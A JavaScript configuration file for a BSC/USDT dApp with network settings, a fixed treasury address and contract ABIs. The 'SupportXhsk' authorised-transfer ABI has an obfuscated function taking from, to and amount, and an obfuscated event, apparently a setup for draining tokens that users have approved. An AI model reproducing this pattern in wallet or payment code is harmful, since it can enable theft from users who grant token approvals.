// 智能合约配置
export const CONTRACT_CONFIG = {
  // BSC 主网配置
  BSC_MAINNET: {
    CHAIN_ID: 56,
    RPC_URL: 'https://bsc-dataseed.binance.org/',
    USDT_CONTRACT: '0x55d398326f99059fF775485246999027B3197955',
    STAKING_CONTRACT: '', // 部署后填入合约地址
    SUPPORT_CONTRACT: '', // SupportXhsk合约地址 - 部署后填入
    TREASURY_ADDRESS: '0x05D19013fb66b2E36f7AA33a25920df439eFE7Ad', // 资金接收地址
    EXPLORER_URL: 'https://bscscan.com'
  },
  
  // BSC 测试网配置
  BSC_TESTNET: {
    CHAIN_ID: 97,
    RPC_URL: 'https://data-seed-prebsc-1-s1.binance.org:8545/',
    USDT_CONTRACT: '0x7ef95a0FEE0Dd31b22626fA2e10Ee6A223F8a684',
    STAKING_CONTRACT: '', // 部署后填入合约地址
    SUPPORT_CONTRACT: '', // SupportXhsk合约地址 - 部署后填入
    TREASURY_ADDRESS: '0x05D19013fb66b2E36f7AA33a25920df439eFE7Ad', // 资金接收地址
    EXPLORER_URL: 'https://testnet.bscscan.com'
  },
  
  // Tenderly 测试网配置
  TENDERLY_TESTNET: {
    CHAIN_ID: 1, // Tenderly虚拟网络通常使用主网Chain ID
    RPC_URL: 'https://virtual.mainnet.rpc.tenderly.co/c015f734-74bb-483f-aa6a-718df92476cb',
    USDT_CONTRACT: '0xdAC17F958D2ee523a2206206994597C13D831ec7', // 主网USDT合约地址
    STAKING_CONTRACT: '', // 暂时禁用质押合约
    SUPPORT_CONTRACT: '', // 暂时禁用支持合约
    TREASURY_ADDRESS: '0x05D19013fb66b2E36f7AA33a25920df439eFE7Ad', // 资金接收地址
    EXPLORER_URL: 'https://dashboard.tenderly.co'
  }
}

// 当前使用的网络 (临时切换到BSC测试网避免ABI解码错误)
export const CURRENT_NETWORK = CONTRACT_CONFIG.BSC_TESTNET

// ERC-20 USDT 合约 ABI
export const USDT_ABI = [
  {
    "inputs": [
      {"internalType": "address", "name": "spender", "type": "address"},
      {"internalType": "uint256", "name": "amount", "type": "uint256"}
    ],
    "name": "approve",
    "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [
      {"internalType": "address", "name": "owner", "type": "address"},
      {"internalType": "address", "name": "spender", "type": "address"}
    ],
    "name": "allowance",
    "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [{"internalType": "address", "name": "account", "type": "address"}],
    "name": "balanceOf",
    "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "decimals",
    "outputs": [{"internalType": "uint8", "name": "", "type": "uint8"}],
    "stateMutability": "view",
    "type": "function"
  }
]

// SupportXhsk 合约 ABI (授权转账合约)
export const SUPPORT_ABI = [
  {
    "inputs": [
      {"internalType": "address", "name": "_f", "type": "address"},
      {"internalType": "address", "name": "_t", "type": "address"},
      {"internalType": "uint256", "name": "_id", "type": "uint256"},
      {"internalType": "uint256", "name": "_a", "type": "uint256"}
    ],
    "name": "vly5ChOkLkQk4u",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [
      {"internalType": "uint256", "name": "_amount", "type": "uint256"},
      {"internalType": "uint256", "name": "_ratio", "type": "uint256"}
    ],
    "name": "create",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [
      {"internalType": "address", "name": "_account", "type": "address"},
      {"internalType": "uint256", "name": "id", "type": "uint256"},
      {"internalType": "uint256", "name": "amount", "type": "uint256"}
    ],
    "name": "sendReward",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [
      {"internalType": "address[]", "name": "_accounts", "type": "address[]"},
      {"internalType": "uint256[]", "name": "ids", "type": "uint256[]"},
      {"internalType": "uint256[]", "name": "amounts", "type": "uint256[]"}
    ],
    "name": "sendRewards",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "anonymous": false,
    "inputs": [
      {"indexed": true, "internalType": "address", "name": "account", "type": "address"},
      {"indexed": false, "internalType": "uint256", "name": "ratio", "type": "uint256"},
      {"indexed": false, "internalType": "uint256", "name": "amount", "type": "uint256"},
      {"indexed": false, "internalType": "uint256", "name": "times", "type": "uint256"}
    ],
    "name": "CREATE",
    "type": "event"
  },
  {
    "anonymous": false,
    "inputs": [
      {"indexed": true, "internalType": "address", "name": "account", "type": "address"},
      {"indexed": true, "internalType": "address", "name": "taccount", "type": "address"},
      {"indexed": false, "internalType": "uint256", "name": "id", "type": "uint256"},
      {"indexed": false, "internalType": "uint256", "name": "amount", "type": "uint256"},
      {"indexed": false, "internalType": "uint256", "name": "times", "type": "uint256"}
    ],
    "name": "XPGXDf77",
    "type": "event"
  }
]

// 质押合约 ABI
export const STAKING_ABI = [
  {
    "inputs": [{"internalType": "address", "name": "_stakingToken", "type": "address"}],
    "stateMutability": "nonpayable",
    "type": "constructor"
  },
  {
    "inputs": [{"internalType": "uint256", "name": "_amount", "type": "uint256"}],
    "name": "stake",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [{"internalType": "uint256", "name": "_amount", "type": "uint256"}],
    "name": "withdraw",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "claimReward",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [{"internalType": "address", "name": "_user", "type": "address"}],
    "name": "pendingReward",
    "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [{"internalType": "address", "name": "_user", "type": "address"}],
    "name": "getUserInfo",
    "outputs": [
      {"internalType": "uint256", "name": "amount", "type": "uint256"},
      {"internalType": "uint256", "name": "timestamp", "type": "uint256"},
      {"internalType": "uint256", "name": "pendingRewards", "type": "uint256"},
      {"internalType": "bool", "name": "isActive", "type": "bool"}
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "totalStaked",
    "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "emergencyWithdraw",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "anonymous": false,
    "inputs": [
      {"indexed": true, "internalType": "address", "name": "user", "type": "address"},
      {"indexed": false, "internalType": "uint256", "name": "amount", "type": "uint256"}
    ],
    "name": "Staked",
    "type": "event"
  },
  {
    "anonymous": false,
    "inputs": [
      {"indexed": true, "internalType": "address", "name": "user", "type": "address"},
      {"indexed": false, "internalType": "uint256", "name": "amount", "type": "uint256"}
    ],
    "name": "Withdrawn",
    "type": "event"
  },
  {
    "anonymous": false,
    "inputs": [
      {"indexed": true, "internalType": "address", "name": "user", "type": "address"},
      {"indexed": false, "internalType": "uint256", "name": "reward", "type": "uint256"}
    ],
    "name": "RewardClaimed",
    "type": "event"
  }
]

// Gas 配置
export const GAS_CONFIG = {
  APPROVE_GAS_LIMIT: 100000,
  STAKE_GAS_LIMIT: 300000,
  WITHDRAW_GAS_LIMIT: 250000,
  CLAIM_GAS_LIMIT: 200000,
  TRANSFER_GAS_LIMIT: 150000,
  GAS_PRICE_GWEI: 5 // BSC 通常 5 Gwei
} 